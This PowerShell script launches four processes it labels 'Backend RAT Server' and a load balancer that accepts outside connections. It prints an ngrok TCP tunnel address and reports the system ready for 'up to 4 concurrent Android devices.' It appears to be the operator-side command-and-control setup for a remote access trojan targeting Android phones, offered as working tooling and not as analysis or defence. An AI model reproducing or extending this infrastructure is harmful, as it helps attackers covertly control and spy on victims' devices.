# Start Backend Server 1
Write-Host "🔧 Starting Backend Server on Port 9889..." -ForegroundColor Green
Start-Process powershell -ArgumentList "-NoExit", "-Command", "cd '$PSScriptRoot'; `$host.UI.RawUI.WindowTitle = 'Backend Server - Port 9889'; Write-Host '🔧 Backend RAT Server - Port 9889' -ForegroundColor Cyan; python fixed_server.py --host 127.0.0.1 --port 9889"
Start-Sleep -Milliseconds 1000

# Start Backend Server 2  
Write-Host "🔧 Starting Backend Server on Port 9890..." -ForegroundColor Green
Start-Process powershell -ArgumentList "-NoExit", "-Command", "cd '$PSScriptRoot'; `$host.UI.RawUI.WindowTitle = 'Backend Server - Port 9890'; Write-Host '🔧 Backend RAT Server - Port 9890' -ForegroundColor Cyan; python fixed_server.py --host 127.0.0.1 --port 9890"
Start-Sleep -Milliseconds 1000

# Start Backend Server 3
Write-Host "🔧 Starting Backend Server on Port 9891..." -ForegroundColor Green
Start-Process powershell -ArgumentList "-NoExit", "-Command", "cd '$PSScriptRoot'; `$host.UI.RawUI.WindowTitle = 'Backend Server - Port 9891'; Write-Host '🔧 Backend RAT Server - Port 9891' -ForegroundColor Cyan; python fixed_server.py --host 127.0.0.1 --port 9891"
Start-Sleep -Milliseconds 1000

# Start Backend Server 4
Write-Host "🔧 Starting Backend Server on Port 9892..." -ForegroundColor Green
Start-Process powershell -ArgumentList "-NoExit", "-Command", "cd '$PSScriptRoot'; `$host.UI.RawUI.WindowTitle = 'Backend Server - Port 9892'; Write-Host '🔧 Backend RAT Server - Port 9892' -ForegroundColor Cyan; python fixed_server.py --host 127.0.0.1 --port 9892"

Write-Host ""
Write-Host "⏳ Waiting 5 seconds for backend servers to start..." -ForegroundColor Yellow
Start-Sleep -Seconds 5

# Start Load Balancer
Write-Host "🎯 Starting Load Balancer on Port 9888..." -ForegroundColor Green
Start-Process powershell -ArgumentList "-NoExit", "-Command", "cd '$PSScriptRoot'; `$host.UI.RawUI.WindowTitle = 'Load Balancer - Port 9888'; Write-Host '🎯 Ngrok Load Balancer' -ForegroundColor Cyan; python ngrok_loadbalancer.py"

Write-Host ""
Write-Host "=" * 70 -ForegroundColor Green
Write-Host "✅ Multi-Device System Started!" -ForegroundColor Green
Write-Host "=" * 70 -ForegroundColor Green
Write-Host ""
Write-Host "📊 System Components:" -ForegroundColor Yellow
Write-Host "  - 4 Backend Servers (localhost:9889-9892) [Internal Only]" -ForegroundColor White
Write-Host "  - 1 Load Balancer (0.0.0.0:9888) [Accepts External Connections]" -ForegroundColor White
Write-Host "  - Ngrok Tunnel: 4.tcp.eu.ngrok.io:14324 → localhost:9888" -ForegroundColor White
Write-Host ""
Write-Host "📱 Ready for up to 4 concurrent Android devices!" -ForegroundColor Green
Write-Host ""
